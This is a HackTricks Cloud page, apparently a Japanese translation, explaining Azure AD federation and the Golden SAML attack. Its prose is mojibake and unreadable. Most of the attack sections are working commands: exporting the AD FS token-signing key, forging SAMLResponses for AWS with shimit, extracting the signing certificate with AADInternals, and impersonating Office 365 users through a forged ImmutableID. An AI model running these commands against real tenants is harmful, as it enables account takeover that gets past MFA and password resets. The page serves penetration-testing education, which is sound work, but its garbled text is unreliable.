# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã¯ã€**ä¿¡é ¼**ã‚’ç¢ºç«‹ã—ãŸ**ãƒ‰ãƒ¡ã‚¤ãƒ³**ã®é›†åˆã§ã™ã€‚ä¿¡é ¼ã®ãƒ¬ãƒ™ãƒ«ã¯ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€é€šå¸¸ã¯**èªè¨¼**ã‚’å«ã¿ã€ã»ã¼å¸¸ã«**èªå¯**ã‚’å«ã¿ã¾ã™ã€‚å…¸å‹çš„ãªãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ã€**å…±æœ‰ã‚¢ã‚¯ã‚»ã‚¹**ã®ãŸã‚ã«**ä¿¡é ¼**ã‚’ç¢ºç«‹ã—ãŸ**è¤‡æ•°ã®çµ„ç¹”**ãŒå«ã¾ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹**ç’°å¢ƒã‚’**Azure AD**ã¨**ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ãƒˆ**ã—ã€ã“ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’èªè¨¼ã¨èªå¯ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã“ã®ã‚µã‚¤ãƒ³ã‚¤ãƒ³æ–¹æ³•ã¯ã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**èªè¨¼ãŒã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã§è¡Œã‚ã‚Œã‚‹**ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã®æ–¹æ³•ã«ã‚ˆã‚Šã€ç®¡ç†è€…ã¯ã‚ˆã‚Šå³æ ¼ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’å®Ÿæ–½ã§ãã¾ã™ã€‚**AD FS**ãŠã‚ˆã³PingFederateã¨ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãŒåˆ©ç”¨å¯èƒ½ã§ã™ã€‚

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬çš„ã«ã€ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ã™ã¹ã¦ã®**èªè¨¼**ãŒ**ã‚ªãƒ³ãƒ—ãƒ¬**ç’°å¢ƒã§è¡Œã‚ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã™ã¹ã¦ã®ä¿¡é ¼ã•ã‚ŒãŸç’°å¢ƒã§SSOã‚’ä½“é¨“ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚ªãƒ³ãƒ—ãƒ¬ã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦**ã‚¯ãƒ©ã‚¦ãƒ‰**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã¾ã™ã€‚

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ã‚µãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ—è¨€èªï¼ˆSAMLï¼‰**ã¯ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼é–“ã§ã®ã™ã¹ã¦ã®èªè¨¼ãŠã‚ˆã³èªå¯ã®**æƒ…å ±**ã®**äº¤æ›**ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã«ã¯ã€3ã¤ã®å½“äº‹è€…ãŒå­˜åœ¨ã—ã¾ã™ï¼š

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ
* ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆIdPï¼‰
* ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆSPï¼‰

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. æœ€åˆã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¾ãŸã¯SPã€ä¾‹ãˆã°AWSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚„vSphere Webã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ç‰¹å®šã®å®Ÿè£…ã«å¿œã˜ã¦ã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒç›´æ¥IdPï¼ˆã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼‰ã«ç§»å‹•ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
2. æ¬¡ã«ã€SPã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã®ãŸã‚ã«é©åˆ‡ãªIdPï¼ˆä¾‹ï¼šAD FSã€Oktaï¼‰ã‚’ç‰¹å®šã—ã¾ã™ã€‚ãã®å¾Œã€SAMLï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ã‚µãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ—è¨€èªï¼‰AuthnRequestã‚’ä½œæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’é¸æŠã—ãŸIdPã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¾ã™ã€‚
3. IdPãŒå¼•ãç¶™ãã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã—ã¾ã™ã€‚èªè¨¼å¾Œã€IdPã«ã‚ˆã£ã¦SAMLResponseãŒä½œæˆã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é€šã˜ã¦SPã«è»¢é€ã•ã‚Œã¾ã™ã€‚
4. æœ€å¾Œã«ã€SPã¯SAMLResponseã‚’è©•ä¾¡ã—ã¾ã™ã€‚æˆåŠŸè£ã«æ¤œè¨¼ã•ã‚Œã‚Œã°ã€IdPã¨ã®ä¿¡é ¼é–¢ä¿‚ã‚’ç¤ºã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ãŒå®Œäº†ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ©ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

**SAMLèªè¨¼ã¨ä¸€èˆ¬çš„ãªæ”»æ’ƒã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ãŸã„å ´åˆã¯ã€æ¬¡ã«é€²ã‚“ã§ãã ã•ã„ï¼š**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FSã¯ã€ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ¢ãƒ‡ãƒ«ã§ã™ã€‚
* "..ã‚¯ãƒ¬ãƒ¼ãƒ ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã—ã¦è¡Œã‚ã‚Œã‚‹å˜ãªã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆï¼ˆä¾‹ãˆã°ã€åå‰ã€ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã€ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰ã§ã‚ã‚Šã€ä¸»ã«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ã©ã“ã«ã§ã‚‚ã‚ã‚‹ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’èªå¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚"
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¯ãƒ¬ãƒ¼ãƒ ã¯SAMLãƒˆãƒ¼ã‚¯ãƒ³å†…ã«æ›¸ãè¾¼ã¾ã‚Œã€IdPã«ã‚ˆã£ã¦æ©Ÿå¯†æ€§ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ç½²åã•ã‚Œã¾ã™ã€‚
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ImmutableIDã«ã‚ˆã£ã¦è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ä¸€æ„ã§ã€Azure ADã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
* ImmutableIDã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ms-DS-ConsistencyGuidã¨ã—ã¦ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®GUIDã‹ã‚‰å°å‡ºã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

**ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLæ”»æ’ƒï¼š**

* ADFSã§ã¯ã€SAML Responseã¯ãƒˆãƒ¼ã‚¯ãƒ³ç½²åè¨¼æ˜æ›¸ã«ã‚ˆã£ã¦ç½²åã•ã‚Œã¾ã™ã€‚
* è¨¼æ˜æ›¸ãŒä¾µå®³ã•ã‚ŒãŸå ´åˆã€Azure ADã«åŒæœŸã•ã‚ŒãŸä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦èªè¨¼ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼
* PTAã®æ‚ªç”¨ã¨åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´ã‚„MFAã¯åŠ¹æœãŒã‚ã‚Šã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ç§ãŸã¡ã¯èªè¨¼å¿œç­”ã‚’å½é€ ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚
* è¨¼æ˜æ›¸ã¯DAæ¨©é™ã‚’æŒã¤AD FSã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰æŠ½å‡ºã§ãã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«æ¥ç¶šã•ã‚ŒãŸä»»æ„ã®ãƒã‚·ãƒ³ã‹ã‚‰ä½¿ç”¨ã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAML

**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆIdPï¼‰**ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚’èªå¯ã™ã‚‹ãŸã‚ã«**SAMLResponse**ã‚’ç”Ÿæˆã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã¯é‡è¦ã§ã™ã€‚IdPã®ç‰¹å®šã®å®Ÿè£…ã«å¿œã˜ã¦ã€**å¿œç­”**ã¯**ç½²å**ã¾ãŸã¯**æš—å·åŒ–**ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆSPï¼‰**ã¯SAMLResponseã®çœŸæ­£æ€§ã‚’ç¢ºèªã—ã€ãã‚ŒãŒä¿¡é ¼ã•ã‚ŒãŸIdPã«ã‚ˆã£ã¦ç™ºè¡Œã•ã‚ŒãŸã‚‚ã®ã§ã‚ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

ã“ã‚Œã¯[ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆæ”»æ’ƒ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ã¨é¡ä¼¼ã—ã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã¨æ¨©é™ã‚’èªè¨¼ã™ã‚‹ãŸã‚ã®ã‚­ãƒ¼ï¼ˆã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆã®KRBTGTã€ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLã®ãƒˆãƒ¼ã‚¯ãƒ³ç½²åç§˜å¯†éµï¼‰ã‚’æ“ä½œã—ã¦**èªè¨¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ï¼ˆTGTã¾ãŸã¯SAMLResponseï¼‰ã‚’å½é€ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã—ã€SPã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ã€‚

ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLã«ã¯ã„ãã¤ã‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ï¼š

* **ãƒªãƒ¢ãƒ¼ãƒˆã§ä½œæˆ**ã§ãã€å¯¾è±¡ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚„ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã®ä¸€éƒ¨ã§ã‚ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
* **äºŒè¦ç´ èªè¨¼ï¼ˆ2FAï¼‰**ãŒæœ‰åŠ¹ã§ã‚‚åŠ¹æœãŒã‚ã‚Šã¾ã™ã€‚
* ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®**ç§˜å¯†éµã¯è‡ªå‹•çš„ã«æ›´æ–°ã•ã‚Œã¾ã›ã‚“**ã€‚
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦ã‚‚**ã€ã™ã§ã«ç”Ÿæˆã•ã‚ŒãŸSAMLã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã›ã‚“ã€‚

#### AWS + AD FS + ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ã¯ã€ä¿¡é ¼ã•ã‚ŒãŸãƒ“ã‚¸ãƒã‚¹ãƒ‘ãƒ¼ãƒˆãƒŠãƒ¼é–“ã§ã®**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£æƒ…å ±ã®å®‰å…¨ãªäº¤æ›**ã‚’ä¿ƒé€²ã™ã‚‹Microsoftã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ãŒãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’å…±æœ‰ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

AWSãŒä¾µå®³ã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹å ´åˆï¼ˆãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§ï¼‰ã€ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦AWSç’°å¢ƒå†…ã®ä»»æ„ã®æ¨©é™ã‚’**å–å¾—ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã®æ”»æ’ƒã«ã¯ã€SAMLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ç½²åã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**ç§˜å¯†éµ**ãŒå¿…è¦ã§ã‚ã‚Šã€ã“ã‚Œã¯ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆæ”»æ’ƒã«ãŠã‘ã‚‹KRBTGTãŒå¿…è¦ãªã“ã¨ã«ä¼¼ã¦ã„ã¾ã™ã€‚AD FSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚Œã°ã€ã“ã®ç§˜å¯†éµã‚’å–å¾—ã§ãã¾ã™ã€‚

ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®è¦ä»¶ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* **ãƒˆãƒ¼ã‚¯ãƒ³ç½²åç§˜å¯†éµ**
* **IdPå…¬é–‹è¨¼æ˜æ›¸**
* **IdPå**
* **ãƒ­ãƒ¼ãƒ«åï¼ˆå¼•ãå—ã‘ã‚‹ãƒ­ãƒ¼ãƒ«ï¼‰**
* ãƒ‰ãƒ¡ã‚¤ãƒ³\ãƒ¦ãƒ¼ã‚¶ãƒ¼å
* AWSã®ãƒ­ãƒ¼ãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³å
* Amazonã‚¢ã‚«ã‚¦ãƒ³ãƒˆID

_å¤ªå­—ã®é …ç›®ã®ã¿ãŒå¿…é ˆã§ã™ã€‚ä»–ã®é …ç›®ã¯ä»»æ„ã§å…¥åŠ›ã§ãã¾ã™ã€‚_

**ç§˜å¯†éµ**ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€**AD FSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚ãã“ã‹ã‚‰ã€ç§˜å¯†éµã‚’[mimikatz](https://github.com/gentilkiwi/mimikatz)ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦**å€‹äººã‚¹ãƒˆã‚¢ã‹ã‚‰ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã§ãã¾ã™ã€‚ä»–ã®å¿…è¦ãªæƒ…å ±ã‚’åé›†ã™ã‚‹ã«ã¯ã€Microsoft.Adfs.Powershellã‚¹ãƒŠãƒƒãƒ—ã‚¤ãƒ³ã‚’æ¬¡ã®ã‚ˆã†ã«åˆ©ç”¨ã§ãã¾ã™ã€‚ADFSãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
æœ‰åŠ¹ãªSAMLResponseã‚’ã€ãªã‚Šã™ã¾ã—ãŸã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å¿˜ã‚Œã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚[**shimit**](https://github.com/cyberark/shimit)**ã‚’ä½¿ç”¨ã—ã¦ï¼š**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ -> ã‚¯ãƒ©ã‚¦ãƒ‰
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ã‚¯ãƒ©ã‚¦ãƒ‰å°‚ç”¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ImmutableIDã‚’ä½œæˆã—ã€å½¼ã‚‰ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
